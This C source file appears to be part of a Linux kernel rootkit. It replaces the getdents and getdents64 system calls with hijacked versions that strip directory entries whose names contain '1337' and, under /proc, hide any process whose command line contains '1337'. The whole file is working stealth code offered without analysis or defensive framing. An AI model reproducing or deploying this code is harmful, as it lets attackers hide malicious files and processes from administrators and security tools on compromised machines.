#include "1337header.h"

extern asmlinkage int (*real_getdents) (unsigned int, struct linux_dirent*, unsigned int);
extern asmlinkage int (*real_getdents64) (unsigned int, struct linux_dirent64*, unsigned int);

int isnumber(char *num){
	int i;
	int b = 1;
	int numlen = strlen(num);
	for(i = 0; i < numlen; i++){
		if(!isdigit(num[i])){
			b = 0;
			break;
		}
	}
	return b;
}

asmlinkage int hijacked_getdents(unsigned int fd, struct linux_dirent *dirp, unsigned int count){

	int num_reads = real_getdents(fd, dirp, count);
	long start_offset_i = 0;

	struct linux_dirent *cdirp = dirp, *pdirp = NULL;
	struct file *f = fget(fd), *fcmdline;
	int i, readnums;
	long start_offset = (long)dirp;
	char *kbuf, *kbuf2, *path;
	bool isproc = false;
	kbuf = kmalloc(PAGE_SIZE, GFP_KERNEL);
	if (kbuf == NULL) {
		num_reads = -ENOMEM;
		goto out;
	}
	kbuf2 = kmalloc(PAGE_SIZE, GFP_KERNEL);
	if (kbuf2 == NULL) {
		num_reads = -ENOMEM;
		goto free_kbuf;
	}
	path = d_path(&f->f_path, kbuf, PAGE_SIZE);
	if (strcmp(path, "/proc") == 0) {
		isproc = true;
	}
//	printk(KERN_DEBUG "isproc value: %s\n %s\n", isproc? "true" : "false", path);
//	printk(KERN_INFO "hijacked call.\n");
//	printk(KERN_INFO "num reads: %d\n",num_reads);

	for (i = 0; i < num_reads; i+= cdirp->d_reclen){
		cdirp = (struct linux_dirent*)(start_offset + i);
//		printk(KERN_INFO "d_ino:%lu, d_reclen:%u, d_off:%lu, d_name: %s \n",
//		       cdirp->d_ino, cdirp->d_reclen, cdirp->d_off, cdirp->d_name);
		if(isproc && isnumber(cdirp->d_name)){
			strcpy(kbuf, "/proc/");
			strcat(kbuf, cdirp->d_name);
			strcat(kbuf, "/cmdline");
			fcmdline = filp_open(kbuf, O_RDONLY, 0);
			readnums = kernel_read(fcmdline, 0, kbuf2, PAGE_SIZE);
			filp_close(fcmdline, NULL);
//			if (readnums != 0)
//				printk("process cmdline %s\n", kbuf2);
			if (readnums != 0 && strstr(kbuf2, "1337") != NULL) {
//				printk("File to hide %s\n", kbuf2);
				pdirp->d_reclen += cdirp->d_reclen;
			} else {
				pdirp = cdirp;
			}
		} else if (strstr(cdirp->d_name,"1337") != NULL){
			if (pdirp == NULL)
				start_offset_i += (long)(cdirp->d_reclen);
			else
				pdirp->d_reclen += cdirp->d_reclen;
		} else {
			pdirp = cdirp;
		}
	}
	kfree(kbuf2);
free_kbuf:
	kfree(kbuf);
out:
	if (start_offset_i != 0)
		memmove((void *)dirp, (void *)((long)dirp + start_offset_i), num_reads - start_offset_i);
	return num_reads - start_offset_i;
}

asmlinkage int hijacked_getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count){

	int num_reads = real_getdents64(fd, dirp, count);

	struct linux_dirent64 *cdirp = dirp, *pdirp = NULL;

	int i;
	long start_offset = (long)dirp;
	long start_offset_i = 0;
	
//	printk(KERN_INFO "hijacked call.\n");
//	printk(KERN_INFO "num reads: %d\n",num_reads);

	for (i = 0; i < num_reads; i+= cdirp->d_reclen){
		cdirp = (struct linux_dirent64*)(start_offset + i);
		
		if (strstr(cdirp->d_name,"1337") != NULL){
			if (pdirp == NULL) {
				start_offset_i += (long)(cdirp->d_reclen);
			} else {
				pdirp->d_reclen += cdirp->d_reclen;
				pdirp->d_off += cdirp->d_reclen;
			}
		} else {
			pdirp = cdirp;
		}
	}
	if (start_offset_i != 0)
		memmove((void *)dirp, (void *)((long)dirp + start_offset_i), num_reads - start_offset_i);

	return num_reads - start_offset_i;
}
